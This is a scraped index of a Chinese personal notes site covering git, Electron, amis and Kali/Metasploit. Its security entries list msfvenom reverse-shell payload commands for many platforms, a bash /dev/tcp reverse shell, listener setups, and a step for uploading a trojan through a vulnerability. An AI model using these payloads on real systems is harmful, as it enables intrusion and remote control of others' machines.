&& git reset --hard feature-axpi-dev && git pull 更新提交信息 针对提交人以及提交邮件的修改. 执行以下代码修改相关信息: git config --global --edit 执行以下代码将修改后的内容应用到commit: git commit --amend --reset-author 注解 修改后可以通过以下命令查看: git config --list 仓库初始化说明 一般来说有两种形式 从本地开始 进入本地项目根目录 执行 git init 初始化仓库 远程新建仓库 设置远程仓库地址 git remote add origin xxx , xxx 表示仓库地址 add 后推送: git push --set-upstream origin master 从远程开始 在远程仓库如 gitee 新建仓库, 可以在此处选择性配置好一些文件 在本地仓库选择好拉取的目录, 执行 git clone xxx 永久删除文件 命令: git filter-branch --force --index-filter 'git rm -rf --cached --ignore-unmatch tagInterface/test.txt' --prune-empty --tag-name-filter cat -- --all -f ilter-branch 重写Git仓库中的提交 -r f 如果想要删除的是文件夹，将会强制并迭代查找文件夹下所有文件并删除。 --index-filter 指定一条Bash命令，然后Git会检出（checkout）所有的提交， 执行该命令，然后重新提交 --all 需要重写所有分支（或引用） 回收空间(实际这一步貌似可以不用): rm -rf .git/refs/original/\ngit reflog expire --expire=now --all\ngit gc --prune=now\ngit gc --aggressive --prune=now 最后强制push: git push -f --all 忽略已在版本控制的文件 已经将某个文件提交到Git仓库中，并且想要忽略它的修改 使用`git update-index`命令将文件标记为已忽略: git update-index --assume-unchanged <file> 如果需要查看哪些文件被标记为已忽略，可以执行如下命令: git ls-files -v | grep '&#94;h' 其中\"h\"表示文件已被标记为\"assume unchanged\"。 如果要 恢复对该文件的跟踪 ，可以使用`git update-index`命令将其取消标记: git update-index --no-assume-unchanged <file> 通过以上操作，您就可以将某个已提交的文件标记为已忽略，从而在以后的提交中忽略它的修改。\n请注意，这只会在本地忽略文件的修改，而不是从版本库中删除它们。\n如果您希望将已提交的文件彻底删除，请使用`git rm`命令，同时将该文件添加到`.gitignore`文件中。 详见: update-index tag的拉取与切换 可能因为tag是静态的吧, 所以如果直接: git pull origin tag 1.0.0 这样拉取, 若于本地tag有冲突, 即使是正常迭代的版本, 也会发生merge冲突(pull默认行为) 故, 一般这样拉取: 先获取到本地版本库: git fetch origin tag 1.0.0 从本地版本tag切换: git checkout tags/1.0.0 注解 拉取时, 会覆盖本地的所有内容, 所以注意保存 全局选项 即, --global 或者 -g , 只是要注意, 当使用 -g 短选项时候, 需要将其放在末尾. 子模块报错 如果使用: git submodule update 出现报错: fatal: no submodule mapping found in .gitmodules for path . 确认 .gitmodules 文件的配置没问题的话, 多半是安装的git版本问题, 换个新一点的版本\n或者支持平台的版本即可. 比如我内网机重置后安装的 git2.1 不行, 换了个 git for windows 2.3 就可以了. 网络不稳定可能导致的报错 使用VPN链接github时候, clone的时候可能会发生: error: RPC failed; curl 18 Transferred a partial file.00 KiB/s\nerror: 2457 bytes of body are still expected\nfetch-pack: unexpected disconnect while reading sideband packet\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output 多半是因为VPN不稳定, 传输数据的时候节点变了, 导致数据不一致,\n可以选择取消 自动选择 , 或者更换其它稳定的VPN试试. 注解 有时候及时没有使用 自动选择 , 节点也可能会不稳定,\n多半是VPN提供商那边的策略有问题... 我用的是 clashX Pro 并配置了 全局配置 出现了这个问题(最开始是没有的),\n然后是这链自己手机热点, 并关闭 全局配置 然后单独设置git 代理(参考 config ): git config --global http.https://github.com.proxy  http://127.0.0.1:60742 单用户配置多把id_rsa 比如给github专门配置一个密钥 按照正常流程生成密钥: $ ssh-keygen -t RSA -C \"yanquer@qq.com\" 注意命名, 我这里公私密钥分别: id_rsa_github.pub\nid_rsa_github 然后编辑 ~/.ssh/config : Host github.com\nHostName github.com\nUser yanquer\nIdentityFile ~/.ssh/id_rsa_github 如果还要给gitee配置一个, 再新建个 id_rsa_gitee 的密钥后增加: Host gitee.com\nHostName gitee.com\nUser yanquer\nIdentityFile ~/.ssh/id_rsa_gitee 完全删除子模块 从 [Git] 如何优雅的删除子模块(submodule)或修改Submodule URL <https://www.jianshu.com/p/ed0cb6c75e25> 看到的 优雅的删除子模块 # 逆初始化模块，其中{MOD_NAME}为模块目录，执行后可发现模块目录被清空 git submodule deinit { MOD_NAME } # 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存） git rm --cached { MOD_NAME } # 提交更改到代码库，可观察到'.gitmodules'内容发生变更 git commit -am \"Remove a submodule.\" 修改某模块URL 修改 .gitmodules 文件中对应模块的 url 属性; 使用 git submodule sync 命令，将新的URL更新到文件 .git/config ； thinker-g@localhost: ~/app$ git submodule sync\nSynchronizing submodule url for 'gitmods/thinker_g/Helpers' thinker-g@localhost: ~/app$ # 运行后可观察到'.git/config'中对应模块的url属性被更新 thinker-g@localhost: ~/app$ git commit -am \"Update submodule url.\" # 提交变更 将已在版本库的文件更为子模块 先建立好子模块仓库,\n假设有一个 submodule_repo 目录需要更改为子模块 先将本地仓库初始化 cd submodule_repo\ngit init\ngit add .\ngit commit -m \"first commit\" 再将远程与本地合并(这个是远程是刚建立的情况, 最多加 License, README 等与本地无关的文件) git remote add origin git@xxx.git git fetch origin # 加 --allow-unrelated-historie  允许无历史线交点合并 # 若不行则切分支合 git merge --allow-unrelated-historie origin/master 返回主仓库清除版本库内容 cd ..\ngit rm -rf --cached submodule_repo\ngit commit -m \"remove submodule_repo\" 将子模块加到 .gitmodules , 没有就新建: [submodule \"submodule_repo\"]\n      path = submodule_repo\n      url = git@xxx.git 然后更新子模块 git submodule init\ngit submodule sync 然后 git status 就可以看到信息了, 再提交即可 git add .\ngit commit -m \"add submodule_repo as submodule\" 将一个本地分支完全覆盖本地另一个分支 比如我现在有一个 main 分支, 我觉得有问题, 想用另一个分支 main-new 覆盖它, 那么可以这样操作 git checkout main-new # 使用 -f 强制将 main 分支指向和 main-new 分支相同的提交 git branch -f main # 如果你不再需要被覆盖的目标分支，可以使用 git branch -D 命令删除 # git branch -D main-new 现在切回 mian 分支, 会发现, main 分支和 main-new 分支一样了","tags":"版本控制","url":"/yq-docs-version-control-git-Some-problems,-usage.html","loc":"/yq-docs-version-control-git-Some-problems,-usage.html"},{"title":"msfconsole","text":"交互式漏洞搜索工具 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ msfconsole\n\nCall trans opt: received. 2 -19-98 13 :24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. ( ` . ,-, ` ` . , ; ' / `.  ,' / . ' `. X /.' .- ; -- '' --.._ ` ` ( . '            /   ` ,           ` ' Q ' ,         ,   `._    \\ ,.|         ' ` -. ; _ ' :  . `  ;    `  ` --,.._; ' ` , ) . ' `._ ,  ' /_ ; , '' -, ; ' ``- ``-..__``--` https://metasploit.com =[ metasploit v6.2.26-dev                          ] + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ] + -- --=[ 951 payloads - 45 encoders - 11 nops            ] + -- --=[ 9 evasion                                       ] Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services Metasploit Documentation: https://docs.metasploit.com/ msf6 > searchsploit ubuntu 16.04 [*] exec: searchsploit ubuntu 16.04 ---------------------------------------------- --------------------------------- Exploit Title                                |  Path ---------------------------------------------- --------------------------------- Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - L | linux/local/40937.txt Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Priv | linux/local/40054.c Google Chrome (Fedora 25 / Ubuntu 16.04) - ' t | linux/local/40943.txt\nLightDM ( Ubuntu 16 .04/16.10 ) - 'Guest Account | linux/local/41923.txt Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14. | linux_x86-64/local/42275.c Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c Linux Kernel (Ubuntu 16.04) - Reference Count | linux/dos/39773.txt Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) | linux/local/45175.c Linux Kernel 4.4 (Ubuntu 16.04) - ' BPF ' Local | linux/local/40759.rb Linux Kernel 4.4 (Ubuntu 16.04) - ' snd_timer_ | linux/dos/46529.c\nLinux Kernel 4 .4.0 ( Ubuntu 14 .04/16.04 x86-64 | linux_x86-64/local/40871.c\nLinux Kernel 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - Ne | linux_x86-64/local/40049.c\nLinux Kernel 4 .4.0-21 < 4 .4.0-51 ( Ubuntu 14 .0 | windows_x86-64/local/47170.c\nLinux Kernel 4 .4.x ( Ubuntu 16 .04 ) - 'double-f | linux/local/39772.txt Linux Kernel 4.6.2 (Ubuntu 16.04.1) - ' IP6T_S | linux/local/40489.txt\nLinux Kernel 4 .8 ( Ubuntu 16 .04 ) - Leak sctp K | linux/dos/45919.c\nLinux Kernel < 4 .13.9 ( Ubuntu 16 .04 / Fedora | linux/local/45010.c\nLinux Kernel < 4 .4.0-116 ( Ubuntu 16 .04.4 ) - L | linux/local/44298.c\nLinux Kernel < 4 .4.0-21 ( Ubuntu 16 .04 x64 ) - | linux_x86-64/local/44300.c\nLinux Kernel < 4 .4.0-83 / < 4 .8.0-58 ( Ubuntu | linux/local/43418.c\nLinux Kernel < 4 .4.0/ < 4 .8.0 ( Ubuntu 14 .04/1 | linux/local/47169.c\n---------------------------------------------- ---------------------------------\nShellcodes: No Results\nmsf6 > # 生成木马文件 msfvenom -p php/meterpreter/reverse_tcp lhost = 192 .168.142.132 lport = 7777 -o shell.php # 将木马文件通过漏洞上传到服务器, 然后触发访问 # 打开交互式msfconsole工具做好监听 msfconsole\n\nuse exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 192 .168.142.132 set lport 7777 exploit lhost 自己机器的ip 详情见: index","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html"},{"title":"MSF生成各种Payload","text":"Windows msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe Linux msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f elf -o payload.elf MAC OS msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f macho -o payload.macho Android msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f apk -o payload.apk PowerShell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 PHP msfvenom -p php/meterpreter_reverse_tcp LHOST = <Your IP Address> LPORT = <Your Port to Connect On> -f raw > shell.php\n\ncat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >>shell.php ASP.net msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f aspx -o payload.aspx JSP msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.jsp War msfvenom -p java/jsp_shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.war Node.js msfvenom -p nodejs/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.js Python msfvenom -p python/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.py # msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.179.129 LPORT=58765 -f raw -o payload.py Perl msfvenom -p cmd/unix/reverse_perl LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.pl Ruby msfvenom -p ruby/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.rb Lua msfvenom -p cmd/unix/reverse_lua LHOST = 攻击机IP LPORT = 攻击机端口 -f raw -o payload.lua Windows ShellCode msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c linux shellcode msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c mac shellcode msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = 攻击机IP LPORT = 攻击机端口 -f c Bash shellcode [ root@localhost ~ ] # msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh [ root@localhost ~ ] # exec 5<>/dev/tcp/xx.xx.xx.xx/xx [ root@localhost ~ ] # cat <&5 | while read line; do $line 2>&5 >&5; done Python shellcode msf5 > use exploit/multi/script/web_delivery\nmsf5 exploit ( multi/script/web_delivery ) > set payload python/meterpreter/reverse_tcp\nmsf5 exploit ( multi/script/web_delivery ) > set srvhost 192 .168.179.129 srvhost = > 192 .168.1.30\nmsf5 exploit ( multi/script/web_delivery ) > set lhost 192 .168.179.129 lhost = > 192 .168.1.30\nmsf5 exploit ( multi/script/web_delivery ) > set lport 58765 msf5 exploit ( multi/script/web_delivery ) > set uripath lyshark uripath = > lyshark\nmsf5 exploit ( multi/script/web_delivery ) > exploit -j -z","tags":"安全","url":"/yq-docs-Safety-kali-MSF-MSF-generates-various-payload.html","loc":"/yq-docs-Safety-kali-MSF-MSF-generates-various-payload.html"},{"title":"msfvenom","text":"生成 payload 注解 venom (毒液) 可参考 MSF生成各种Payload","tags":"安全","url":"/yq-docs-Safety-kali-MSF-msfvenom.html","loc":"/yq-docs-Safety-kali-MSF-msfvenom.html"},{"title":"问题","text":"","tags":"文档","url":"/yq-docs-document-question-index.html","loc":"/yq-docs-document-question-index.html"},{"title":"异常","text":"在 TypeScript 中，没有像 Python 中的 ValueError 这样的内置异常类型。\n不过，你可以自定义异常类来表示特定的错误情况。 示例，在 TypeScript 中自定义异常类: class ValueError extends Error {\n    constructor(message: string) {\n        super(message);\n        this.name = \"ValueError\";\n    }\n}\n\nfunction divide(a: number, b: number): number {\n    if (b === 0) {\n        throw new ValueError(\"除数不能为零！\");\n    }\n    return a / b;\n}\n\ntry {\n    const result = divide(10, 0);\n    console.log(result);\n} catch (error) {\n    if (error instanceof ValueError) {\n        console.error(\"发生值错误：\", error.message);\n    } else {\n        console.error(\"发生错误：\", error.message);\n    }\n} 在 divide 函数中，我们使用 throw 关键字抛出一个 ValueError 异常，提供了相应的错误消息。 在 try 块中，我们调用 divide 函数，并根据异常对象的类型进行适当的处理。\n如果捕获到的异常是 ValueError 类型的，我们打印出值错误的消息，否则打印一般错误的消息。 注解 使用 throw 抛出异常","tags":"前端","url":"/yq-docs-front-end-Conceptual-abnormal.html","loc":"/yq-docs-front-end-Conceptual-abnormal.html"},{"title":"electron-builder配置生成位置","text":"在 package.json 的 build 位置: \"build\": {                    // electron-builder的配置\n  \"productName\":\"xxxx\",       // 项目名 这也是生成的exe文件的前缀名\n  \"appId\": \"com.xxx.xxxxx\",   // 包名\n  \"copyright\":\"xxxx\",         // 版权  信息\n  \"directories\": {\n    \"output\": \"build\"         // 输出文件夹, 只能配置输出的上面几层,\n                              // 比如mac下默认输出位置是 dist/mac,\n                              // 在这里配置了output 为 dist/myapp,\n                              // 最终输出位置还是有mac, 会变成 dist/myapp/mac\n                              // 坑的一批\n  },\n\n  // windows相关的配置\n  \"win\": {\n    \"icon\": \"xxx/icon.ico\"// 图标路径\n  }\n} 部分参考: https://segmentfault.com/a/1190000017296201","tags":"前端","url":"/yq-docs-front-end-frame-Electron-Electron-Builder-configuration.html","loc":"/yq-docs-front-end-frame-Electron-Electron-Builder-configuration.html"},{"title":"electron生命周期","text":"退出的两个调用: app.quit(): 尝试关闭所有窗口(如果窗口有 window.on('close', (e) => e.preventDefault()) 则失败)\n- 首先发出 before-quit 事件，如果所有窗口关闭成功，则发出 will-quit 事件，然后 app 退出\n- 此方法会确保执行所有的 beforeunload 和 unload（dom）事件，当然可以在 beforeunload 事件中返回 false 阻止继续退出。 app.exit([code]): 使用 exitCode 立即退出。exitCode 默认为0\n- 所有窗口立即关闭，而不询问用户，且不触发 beforeunload 和 unload 事件","tags":"前端","url":"/yq-docs-front-end-frame-Electron-Electron-life-cycle.html","loc":"/yq-docs-front-end-frame-Electron-Electron-life-cycle.html"},{"title":"webstrom中如何进行调试","text":"主要针对ts项目 因为ts需要编译成js使用, 所以断点需要打在编译后的js文件内 命令行触发浏览器调试 有个 electron 有个内置的开启debug, 直接命令触发: ./node_modules/.bin/electron . --inspect 其中 --inspect 可以跟端口(默认9229): --inspect=8888 启动后, 在 Chrome 浏览器（或其他基于 Chromium 开发的浏览器）\n中打开 chrome://inspect 即可看到对应的调试会话 webstrom开启调试 如下配置 其中参数 out/main.js 是编译好的入口文件. 注意解释器需要选 electron 的路径 这时候把断点打在相应的js文件并点击小虫子即可开启调试 若需要直接上面的在浏览器中调试, 增加参数即可: --remote-debugging-port=9222 注解 直接点击 package.json 启动是无法进行调试的.","tags":"前端","url":"/yq-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html","loc":"/yq-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html"},{"title":"一些遇到过的报错","text":"报错内容: error /Users/yanque/project/webstorm/electron-study/node_modules/electron: Command failed.\nExit code: 1\nCommand: node install.js\nArguments:\nDirectory: project/webstorm/electron-study/node_modules/electron\nOutput:\nReadError: The server aborted pending request 原因: electron 下载不会使用本地配置的 registry 镜像,\n需要额外配置 electron_mirror : yarn config set electron_mirror https://npm.taobao.org/mirrors/electron/","tags":"前端","url":"/yq-docs-front-end-frame-Electron-Install-error.html","loc":"/yq-docs-front-end-frame-Electron-Install-error.html"},{"title":"一些问题","text":"preload无法导入其他ts BrowserWindow加载参数webPreferences.preload, 当preload调用了node的api时, 需要将 nodeIntegration 设置为 true: const mainWindow = new BrowserWindow({\n      width: 800,\n      height: 600,\n      webPreferences: {\n          // 集成nodejs, preload脚本中使用了Node.js的API时必设为true, 才能正常执行\n          nodeIntegration: true,\n          preload: join(__dirname, 'preload.js')\n      }\n  })","tags":"前端","url":"/yq-docs-front-end-frame-Electron-some-problems.html","loc":"/yq-docs-front-end-frame-Electron-some-problems.html"},{"title":"api配置-数据加载/刷新","text":"amis有数据域的概念, 数据域也可以从api加载. 普通的 ajax 请求 格式: [<method>:]<url> method：get、post、put、delete，默认为 get url：接口地址，即模板字符串 如: {\n  \"api\": \"get:/amis/api/initData\", // get 请求\n  \"api\": \"post:/amis/api/initData\", // post 请求\n  \"api\": \"put:/amis/api/initData\", // put 请求\n  \"api\": \"delete:/amis/api/initData\" // delete 请求\n} 注意接口返回格式: {\n  \"status\": 0,\n  \"msg\": \"\",\n  \"data\": {\n    ...其他字段\n  }\n} status: 返回 0，表示当前接口正确返回，否则按错误请求处理； msg: 返回接口处理信息，主要用于表单提交或请求失败时的 toast 显示； data: 必须返回一个具有 key-value 结构的对象。 注解 api默认发送当前数据域的数据, 可以在当前元素手动配置 data 来自定义发送的数据 预加载数据 使用 initApi , 基本可用于所有组件 注解 实际使用的时候遇到一个问题, 写在 form 的上一层 dialog 组件, 没有生效,\n换到 form 组件, 就可以了, 不知是为何","tags":"前端","url":"/yq-docs-front-end-frame-amis-API-configuration.html","loc":"/yq-docs-front-end-frame-amis-API-configuration.html"},{"title":"表达式语法","text":"JS对象与字符串转换 ENCODEJSON 将JS对象转换为字符串,\n例: data: {\n    envStr: '${ENCODEJSON(envObj)}',\n}, DECODEJSON 将字符串转换为JS对象,\n例: data: {\n    envObj: '${DECODEJSON(envStr)}',\n},","tags":"前端","url":"/yq-docs-front-end-frame-amis-Expression-grammar.html","loc":"/yq-docs-front-end-frame-amis-Expression-grammar.html"},{"title":"表单校验","text":"用法 validations 配置校验规则, 尽量使用JSON格式而不推荐字符串, 如: {\n  \"type\": \"input-text\",\n  \"label\": \"文本\",\n  \"name\": \"text\",\n  \"validations\": {\n    \"isNumeric\": true\n  },\n  \"description\": \"请输入数字类型文本\"\n} 支持的校验 参考: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/formitem#自定义校验信息 isNumeric 是否是数字 完整: {\n  isEmail: 'validate.isEmail',\n  isRequired: 'validate.isRequired',\n  isUrl: 'validate.isUrl',\n  isInt: 'validate.isInt',\n  isAlpha: 'validate.isAlpha',\n  isNumeric: 'validate.isNumeric',\n  isAlphanumeric: 'validate.isAlphanumeric',\n  isFloat: 'validate.isFloat',\n  isWords: 'validate.isWords',\n  isUrlPath: 'validate.isUrlPath',\n  matchRegexp: 'validate.matchRegexp',\n  minLength: 'validate.minLength',\n  maxLength: 'validate.maxLength',\n  maximum: 'validate.maximum',\n  lt: 'validate.lt',\n  minimum: 'validate.minimum',\n  gt: 'validate.gt',\n  isJson: 'validate.isJson',\n  isLength: 'validate.isLength',\n  notEmptyString: 'validate.notEmptyString',\n  equalsField: 'validate.equalsField',\n  equals: 'validate.equals',\n  isPhoneNumber: 'validate.isPhoneNumber',\n  isTelNumber: 'validate.isTelNumber',\n  isZipcode: 'validate.isZipcode',\n  isId: 'validate.isId',\n  /* 日期时间相关校验规则 2.2.0 及以上版本生效 */\n  isDateTimeSame: 'validate.isDateTimeSame',\n  isDateTimeBefore: 'validate.isDateTimeBefore',\n  isDateTimeAfter: 'validate.isDateTimeAfter',\n  isDateTimeSameOrBefore: 'validate.isDateTimeSameOrBefore',\n  isDateTimeSameOrAfter: 'validate.isDateTimeSameOrAfter',\n  isDateTimeBetween: 'validate.isDateTimeBetween',\n  isTimeSame: 'validate.isTimeSame',\n  isTimeBefore: 'validate.isTimeBefore',\n  isTimeAfter: 'validate.isTimeAfter',\n  isTimeSameOrBefore: 'validate.isTimeSameOrBefore',\n  isTimeSameOrAfter: 'validate.isTimeSameOrAfter',\n  isTimeBetween: 'validate.isTimeBetween',\n  isVariableName: 'validate.isVariableName'\n} JS函数自定义规则 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/addon#扩展表单验证 官网用例: let amisLib = amisRequire('amis');\namisLib.addRule(\n  // 校验名\n  'isZXS',\n  // 校验函数，values 是表单里所有表单项的值，可用于做联合校验；value 是当前表单项的值\n  (values, value) => {\n    if (value === '新加坡') {\n      // 校验不通过，提示：该地区不在国内\n      return {\n        error: true,\n        msg: '该地区不在国内'\n      };\n    }\n\n    if (\n      value === '北京' ||\n      value === '上海' ||\n      value === '天津' ||\n      value === '重庆'\n    ) {\n      // return true 表示校验通过\n      return true;\n    }\n\n    // 校验不通过，提示：输入的不是直辖市\n    return {\n      error: true,\n      msg: '输入的不是直辖市'\n    };\n  }\n); 其他相关配置 表单项值发生变化即校验 \"validateOnChange\": true","tags":"前端","url":"/yq-docs-front-end-frame-amis-Form-verification.html","loc":"/yq-docs-front-end-frame-amis-Form-verification.html"},{"title":"amis-支持的actonType(事件动作)","text":"参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action 自定义JS 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#自定义-js actionType 为 custom script 为函数或者函数字符串,\n函数签名: script:(context,doAction,event)=>{} context，渲染器上下文 doAction() 动作执行方法，用于调用任何 actionType 指定的动作 event，事件对象，可以调用 setData()、stopPropagation()、preventDefault()\n分别实现事件上下文设置、动作干预、事件干预，可以通过 event.data 获取事件上下文(应该叫数据域吧) 参考: {\n  \"type\": \"page\",\n  \"body\": [\n    {\n      \"type\": \"button\",\n      \"label\": \"发送一个 http 请求\",\n      \"level\": \"primary\",\n      \"onEvent\": {\n        \"click\": {\n          \"actions\": [\n            {\n              \"actionType\": \"custom\",\n              \"script\": \"doAction({actionType: 'ajax', args: {api: '/amis/api/mock2/form/saveForm'}});\\n //event.stopPropagation();\"\n            }\n          ]\n        }\n      }\n    }\n  ]\n} 注解 对于 button 的点击事件, 直接在其同级写 actionType: \"custom\" 无效,\n需要定义 onEvent -> click -> actions 才行(如上). 存储数据 有时在执行自定义 JS 的时候，希望该过程中产生的数据可以分享给后面的动作使用，\n此时可以通过 event.setData() 来实现事件上下文的设置，这样后面动作都可以通过事件上下文来获取共享的数据。 注意：直接调用 event.setData() 将修改事件的原有上下文，\n如果不希望覆盖可以通过 event.setData({...event.data, ...{xxx: xxx}}) 来进行数据的合并。","tags":"前端","url":"/yq-docs-front-end-frame-amis-Supported-ActonType.html","loc":"/yq-docs-front-end-frame-amis-Supported-ActonType.html"},{"title":"amis","text":"Github地址: https://github.com/baidu/amis Amis 是百度开源的一块前端低代码框架，\n通过 JSON 配置就能生成各种后台页面，极大减少开发成本，甚至可以不需要了解前端。 使用 原文: https://aisuda.bce.baidu.com/amis/zh-CN/docs/start/getting-started 有两种方式 原生JS脚本导入(SDK导入) 直接 npm i amis , 在 node_modulesamissdk 目录里就能找到;\n或者直接下载包文件 https://github.com/baidu/amis/releases/download/3.5.2/sdk.tar.gz , 手动解压. 用例: <script src=\"sdk.js\"></script>\n<script type=\"text/javascript\">\n  (function () {\n    let amis = amisRequire('amis/embed');\n    // 通过替换下面这个配置来生成不同页面\n    let amisJSON = {\n      type: 'page',\n      title: '表单页面',\n      body: {\n        type: 'form',\n        mode: 'horizontal',\n        api: '/saveForm',\n        body: [\n          {\n            label: 'Name',\n            type: 'input-text',\n            name: 'name'\n          },\n          {\n            label: 'Email',\n            type: 'input-email',\n            name: 'email'\n          }\n        ]\n      }\n    };\n    let amisScoped = amis.embed('#root', amisJSON);\n  })();\n</script> 默认 amis 渲染是单页模式 如果是单页应用，在离开当前页面的时候通常需要销毁实例: amisScoped.unmount(); React项目 直接 npm i amis 数据域初始化 直接使用确定的数据 使用 data : {\n  \"type\": \"page\",\n  \"data\": {\n    \"name\": \"zhangsan\",\n    \"age\": 20\n  },\n  \"body\": [\n    {\n      \"type\": \"tpl\",\n      \"tpl\": \"my name is ${name}\"\n    }\n  ]\n} 从API获取初始化的数据 使用 initApi {\n  \"type\": \"page\",\n  \"initApi\": \"/amis/api/initData\",\n  \"body\": \"Hello ${text}\"\n} 注意API的返回数据必定是这种格式: {\n  \"status\": 0,\n  \"msg\": \"\",\n  \"data\": {\n    \"text\": \"World!\"\n    ...其他字段\n  }\n} 以上最外层字段必须有, 可以增加, 不能减少, data 类型必是字典 注解 并不是所有组件都支持配置初始化接口来实现数据域初始化操作，\n对于那些 不支持配置初始化接口的组件 来说，一般会使用 Service 组件 来辅助实现数据域初始化； 如果两种同时配置, 那么将会合并两种结果 重要 什么叫, 具备数据域的组件? 直白来说, 就是当经过这一层时候, 会创建新的数据域,\n这个时候 当定义data时, 无法使用$来引用上层数据域的数据 , 而是直接将其当作字符串. 具备数据域的组件(或者说 支持配置初始化接口 的组件?): App Page Cards Chart CRUD CRUD2 Dialog Drawer List Page PaginationWrapper Service Wizard Combo InputArray Table Table2 注解 一般对于不支持数据域的组件, 想使用数据域时, 往往是在外层包裹一层 Service 数据链 一般情况下, 子层的数据域, 如果获取的值不存在, 会递归向上查找,\n甚至可以拿到URL路径的参数(url 中的参数会进入顶层数据域) 默认行为, 预定义只找上层和上上层. 定义查找范围, 使用 trackExpression : trackExpression: \"none\" : 不追踪任何数据 trackExpression: \"${xxxVariable}\" : xxxVariable 变化了更新当前组件的数据链\n可以监听多个变量比如: \"${xxx1},${xxx2}\"，还可以写表达式如 \"${ xxx ? xxx : yyy}\"。 如果变量是数组，或者对象，会转成统一的字符串 [object Array] 或者 [object Object] ;\n这个其实会影响检测的，所以建议转成 json 字符串如。 ${xxxObject | json}。\n还有就是既然是监控上层数据，表达式中不要写当前层数据变量，是取不到的。 逻辑函数 IF(condition, consequent, alternate) -> consequent | alternate\n相当于三目表达式. AND(expression1, expression2, ...expressionN) -> bool OR(expression1, expression2, ...expressionN) -> bool XOR(condition1, condition2, ...expressionN) -> bool IFS(condition1, result1, condition2, result2,...conditionN, resultN) -> any\n相当于多个 else if 合并成一个 数学函数 ABS(num) -> number\n求绝对值 MAX(num1, num2, ...numN) -> number\n如果只有一个参数且是数组，则计算这个数组内的值, 下同 MIN(num1, num2, ...numN) -> number SUM(num1, num2, ...numN) -> number INT(num) -> number MOD(num, divisor) -> number\n返回两数相除的余数，参数 number 是被除数，divisor 是除数。 PI() -> number\n圆周率 ROUND(num[, numDigits = 2]) -> number\n将数字四舍五入到指定的位数，可以设置小数位 FLOOR(num[, numDigits=2])\n向下取整 CEIL(num[, numDigits=2]) -> number\n将数字向上取整到指定的位数，可以设置小数位 SQRT(num) -> number\n开平方，参数 number 为非负数 AVG(num1, num2, ...numN) -> number\n平均值 DEVSQ(num1, num2, ...numN) -> number\n返回数据点与数据均值点之差（数据偏差）的平方和，如果只有一个参数且是数组，则计算这个数组内的值。 AVEDEV(num1, num2, ...numN) -> number\n数据点到其算术平均值的绝对偏差的平均值 HARMEAN(num1, num2, ...numN) -> number\n数据点的调和平均值，如果只有一个参数且是数组，则计算这个数组内的值 LARGE(array, k) -> number\n数据集中第 k 个最大值 UPPERMONEY(num) -> string\n将数值转为中文大写金额 RAND() -> number\n返回大于等于 0 且小于 1 的均匀分布随机实数。每一次触发计算都会变化 LAST(array) -> any\n取数组最后一个 POW(base, exponent) -> number\n基数 base 的指数次幂 文本函数 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts /expression#新表达式语法 日期函数 数组函数 编码函数 ENCODEJSON({name: 'amis'})\n将JS对象转换成JSON字符串 DECODEJSON('{\"name\": \"amis\"}')\n解析JSON编码数据，返回JS对象 其他函数 GET(obj:any, path:string, defaultValue:any)\n根据对象或者数组的path路径获取值。 如果解析 value 是 undefined 会以 defaultValue 取代 ISTYPE(obj:any, type: string)\n判断是否为类型支持：string, number, array, date, plain-object\n如: ISTYPE([{a: '1'}, {b: '2'}, {a: '1'}], 'array') 图标使用 详细见: https://aisuda.bce.baidu.com/amis/zh-CN/components/icon 